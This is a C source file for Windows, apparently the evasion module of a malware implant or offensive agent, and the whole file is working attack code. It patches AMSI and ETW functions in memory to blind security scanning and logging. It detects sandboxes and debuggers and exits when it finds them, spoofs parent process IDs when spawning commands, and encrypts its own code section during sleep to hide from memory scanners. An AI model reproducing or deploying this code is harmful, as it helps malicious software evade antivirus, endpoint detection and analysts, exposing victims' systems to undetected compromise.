#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <ctype.h>
#include "evasion.h"
#include "api_resolve.h"

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif


typedef BOOL (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);

/* Stored in .data/.bss — always accessible, even when .text is protected. */
static VProt_t   g_VProt   = NULL;
static NtDelay_t g_NtDelay = NULL;
static void     *g_text    = NULL;
static SIZE_T    g_tsz     = 0;

/* ── Startup helpers (run from .text before any sleep masking) ─────────── */

static void patch_fn(const char *mod, const char *sym) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    if (!h) return;
    FARPROC fn = GetProcAddress(h, sym);
    if (!fn) return;
    /* xor eax,eax; ret — returns AMSI_RESULT_CLEAN (0) / S_OK (0) */
    unsigned char p[3] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
    memcpy((void*)fn, p, 3);
    VirtualProtect((void*)fn, 3, old, &old);
}

static void find_text(void) {
    HMODULE base = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (memcmp(s->Name, ".text", 5) == 0) {
            g_text = (BYTE*)base + s->VirtualAddress;
            g_tsz  = s->Misc.VirtualSize;
            return;
        }
    }
}

/* ── Sandbox / analysis environment detection ──────────────────────────────
 * Score-based: exits silently if score >= 4.  Called before evasion_init().
 */
void sandbox_check(void) {
    if (IsDebuggerPresent()) ExitProcess(0);  /* immediate */

    int score = 0;

    /* CPU count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) score++;

    /* RAM */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        if (ms.ullTotalPhys < (ULONGLONG)512  * 1024 * 1024) score += 3;
        else if (ms.ullTotalPhys < (ULONGLONG)1024 * 1024 * 1024) score++;
    }

    /* Disk C: */
    ULARGE_INTEGER totalBytes;
    totalBytes.QuadPart = 0;
    if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL))
        if (totalBytes.QuadPart < (ULONGLONG)40 * 1024 * 1024 * 1024) score++;

    /* Username */
    char username[128] = {0};
    DWORD u_sz = sizeof(username);
    GetUserNameA(username, &u_sz);
    char low_u[128] = {0};
    for (int i = 0; username[i] && i < 127; i++)
        low_u[i] = (char)tolower((unsigned char)username[i]);
    const char *bad[] = {"sandbox","malware","virus","analyst","cuckoo","maltest","vmuser","tequilaboomboom"};
    for (int i = 0; i < 8; i++)
        if (strstr(low_u, bad[i])) { score += 3; break; }

    if (score >= 4) ExitProcess(0);
}

/* ── PPID spoofing — spawn a process with a fake parent PID ─────────────── */
int spawn_with_ppid(const char *cmd, const char *parent_name) {
    /* Find the parent PID by process name */
    DWORD parent_pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            char narrow[MAX_PATH] = {0};
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, narrow, sizeof(narrow)-1, NULL, NULL);
            char lo[MAX_PATH] = {0}, lp[MAX_PATH] = {0};
            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++) lo[i] = (char)tolower((unsigned char)narrow[i]);
            for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++) lp[i] = (char)tolower((unsigned char)parent_name[i]);
            if (strcmp(lo, lp) == 0) { parent_pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!parent_pid) return 0;

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent) return 0;

    SIZE_T attr_sz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_sz);
    if (!attrList) { CloseHandle(hParent); return 0; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attr_sz)) {
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(hParent), NULL, NULL);

    STARTUPINFOEXW siEx;
    ZeroMemory(&siEx, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.lpAttributeList = attrList;

    int wcmd_len = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
    WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wcmd_len * sizeof(WCHAR));
    if (!wcmd) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wcmd_len);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, &siEx.StartupInfo, &pi);

    HeapFree(GetProcessHeap(), 0, wcmd);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);
    if (!ok) return 0;

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

void evasion_init(void) {
    patch_fn("amsi.dll",  "AmsiScanBuffer");
    patch_fn("amsi.dll",  "AmsiScanString");
    patch_fn("ntdll.dll", "EtwEventWrite");

    HMODULE k32   = GetModuleHandleA("kernel32.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_VProt   = (VProt_t)  GetProcAddress(k32,   "VirtualProtect");
    g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
    find_text();
}

/* ── sleep_masked lives in .evasn — executes while .text is PAGE_NOACCESS ─
 *
 * Design: all kernel calls go through function pointers in .data so they
 * bypass any .text import thunks.  The XOR loop and this function itself
 * live in .evasn, not .text.  The return address (pointing into .text) is
 * safe because we restore .text to RX before the ret instruction runs.
 */
__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    if (!g_text || !g_VProt || !g_NtDelay) {
        /* Fallback: unmasked sleep — only happens if init wasn't called */
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        if (g_NtDelay) g_NtDelay(FALSE, &t);
        return;
    }

    unsigned char *text = (unsigned char*)g_text;
    SIZE_T sz = g_tsz;
    DWORD old;

    /* 1. Make .text writable and XOR-encrypt it */
    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;

    /* 2. Seal .text from memory scanners */
    g_VProt(text, sz, PAGE_NOACCESS, &old);

    /* 3. Sleep — execution is inside ntdll.dll syscall, not .text */
    LARGE_INTEGER iv;
    iv.QuadPart = -(LONGLONG)ms * 10000LL;
    g_NtDelay(FALSE, &iv);

    /* 4. Restore — still in .evasn here */
    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
    /* ret → jumps to .text return address, now RX ✓ */
}
